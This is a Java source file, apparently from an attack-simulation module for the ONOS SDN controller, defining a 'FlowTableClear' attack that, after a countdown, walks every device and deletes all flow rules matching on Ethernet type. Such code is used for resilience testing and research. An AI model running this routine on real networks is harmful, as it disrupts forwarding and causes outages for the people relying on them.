package org.onosproject.airs.attack;

import java.util.Iterator;

import org.onosproject.net.Device;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.FlowEntry;
import org.onosproject.net.flow.FlowRuleService;
import org.onosproject.net.flow.TrafficSelector;
import org.onosproject.net.flow.criteria.Criterion;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class FlowTableClear extends AbstractAttack {

  public static final String NAME = "FlowTableClear";
  public static final String DESCR = "Flow table clearance";

  private final Logger log = LoggerFactory.getLogger(getClass());

  private final DeviceService deviceService;
  private final FlowRuleService flowRuleService;

  public FlowTableClear(final DeviceService deviceService, final FlowRuleService flowRuleService,
    final int countdownSec) {
    super(NAME, DESCR, countdownSec);

    this.deviceService = deviceService;
    this.flowRuleService = flowRuleService;
  }

  @Override
  protected Logger getLog() {
    return log;
  }

  @Override
  protected void runAttack() {
    final int cnt = 1;
    for (int i = 0; i < cnt; i++) {
      final Iterable<Device> devices = deviceService.getDevices();
      final Iterator<Device> deviceIter = devices.iterator();
      while (deviceIter.hasNext()) {
        final Device device = (Device) deviceIter.next();
        final Iterable<FlowEntry> flowEntries = flowRuleService.getFlowEntries(device.id());
        final Iterator<FlowEntry> flowEntryIter = flowEntries.iterator();
        while (flowEntryIter.hasNext()) {
          final FlowEntry flowEntry = (FlowEntry) flowEntryIter.next();
          final TrafficSelector select = flowEntry.selector();
          final Criterion criterion = select.getCriterion(Criterion.Type.ETH_TYPE);
          if (criterion != null) {
            flowRuleService.removeFlowRules(flowEntry);
            try {
              Thread.sleep(500);
            } catch (final InterruptedException e) {
              getLog().error("interrupted during sleep", e);
            }
          }
        }
      }
    }
  }
}
